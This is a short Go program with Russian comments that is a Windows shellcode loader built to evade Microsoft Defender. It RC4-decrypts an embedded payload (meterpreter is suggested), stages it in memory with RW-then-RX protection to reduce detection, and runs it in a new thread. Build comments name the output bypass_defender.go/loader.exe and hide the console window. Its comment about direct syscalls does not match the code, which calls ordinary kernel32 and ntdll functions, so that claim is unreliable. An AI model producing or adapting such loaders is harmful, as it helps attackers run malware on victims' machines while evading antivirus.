package main

import (
    "syscall"
    "unsafe"
    "crypto/rc4"
    "encoding/hex"
)

func main() {
    // Шифрованный шеллкод (например, meterpreter)
    encryptedShellcode, _ := hex.DecodeString("DEADBEEF...") // твой шеллкод
    
    // RC4 дешифровка
    cipher, _ := rc4.NewCipher([]byte("rc4key123"))
    shellcode := make([]byte, len(encryptedShellcode))
    cipher.XORKeyStream(shellcode, encryptedShellcode)
    
    // Прямые syscall'ы (обход user-mode hooks)
    kernel32 := syscall.NewLazyDLL("kernel32.dll")
    ntdll := syscall.NewLazyDLL("ntdll.dll")
    
    VirtualAlloc := kernel32.NewProc("VirtualAlloc")
    VirtualProtect := kernel32.NewProc("VirtualProtect")
    RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
    CreateThread := kernel32.NewProc("CreateThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
    
    // Выделяем память RW
    addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), 
        0x1000|0x2000, 0x04) // MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE
    
    // Копируем шеллкод
    RtlCopyMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), 
        uintptr(len(shellcode)))
    
    // Меняем защиту на RX (не RWX чтобы меньше детектиться)
    oldProtect := uint32(0)
    VirtualProtect.Call(addr, uintptr(len(shellcode)), 0x20, // PAGE_EXECUTE_READ
        uintptr(unsafe.Pointer(&oldProtect)))
    
    // Создаем поток
    thread, _, _ := CreateThread.Call(0, 0, addr, 0, 0, 0)
    WaitForSingleObject.Call(thread, 0xFFFFFFFF)
}


//GOOS=windows GOARCH=amd64 go build -ldflages="-s -w -H=windowsgui" -o loader.exe bypass_defender.go
//or
//tinygo build -target windows -no-debug -o loader.exe bypass_defender.go
